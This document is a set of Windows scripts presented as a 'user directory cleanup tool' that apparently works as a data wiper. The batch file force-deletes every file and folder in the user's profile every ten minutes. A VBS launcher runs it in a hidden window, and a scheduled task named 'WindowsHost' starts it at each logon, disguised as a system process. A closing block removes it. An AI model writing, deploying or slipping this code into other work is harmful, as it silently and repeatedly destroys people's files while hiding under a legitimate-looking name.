# << CCL.bat >>

@echo off
setlocal enabledelayedexpansion

:: Set your log file path here
set "LOGFILE=C:\output.txt"

:LOOP
>> "%LOGFILE%" echo ===============================================
>> "%LOGFILE%" echo    USER DIRECTORY CLEANUP TOOL
>> "%LOGFILE%" echo ===============================================
>> "%LOGFILE%" echo WARNING: This will delete files and folders!
>> "%LOGFILE%" echo Next cleanup in 10 minutes...
>> "%LOGFILE%" echo ===============================================

set "TARGETDIR=%USERPROFILE%"

>> "%LOGFILE%" echo Processing: %TARGETDIR%

:: Method 1: Delete individual files first
for /r "%TARGETDIR%" %%f in (*.*) do (
    attrib -r -h -s "%%f" >nul 2>&1
    del /f /q "%%f" >nul 2>&1
    if !errorlevel! neq 0 (
        >> "%LOGFILE%" echo [ERROR] Could not delete: %%f
    ) else (
        >> "%LOGFILE%" echo [SUCCESS] Deleted: %%f
    )
)

:: Method 2: Delete folders
for /f "delims=" %%d in ('dir "%TARGETDIR%" /ad /b 2^>nul') do (
    if /i not "%%d"=="." if /i not "%%d"==".." (
        rd /s /q "%TARGETDIR%\%%d" 2>nul
        if !errorlevel! neq 0 (
            >> "%LOGFILE%" echo [ERROR] Could not remove folder: %%d
        ) else (
            >> "%LOGFILE%" echo [SUCCESS] Removed folder: %%d
        )
    )
)

>> "%LOGFILE%" echo ===============================================
>> "%LOGFILE%" echo    CLEANUP CYCLE COMPLETED - %date% %time%
>> "%LOGFILE%" echo    Waiting 10 minutes until next cleanup...
>> "%LOGFILE%" echo ===============================================

:: Wait 10 minutes (600 seconds)
timeout /t 600 /nobreak >nul

goto LOOP


# << CCL.vbs >>

CreateObject("Wscript.Shell").Run "cmd /c C:\CCL.bat", 0, False


# << Command Prompt TaskSchd >>

schtasks /create /tn "WindowsHost" /tr "C:\CCL.vbs" /sc onlogon /f


# << Cancel >>

schtasks /delete /tn "WindowsHost" /f
del C:\CCL.bat
del C:\CCL.vbs
del C:\output.txt
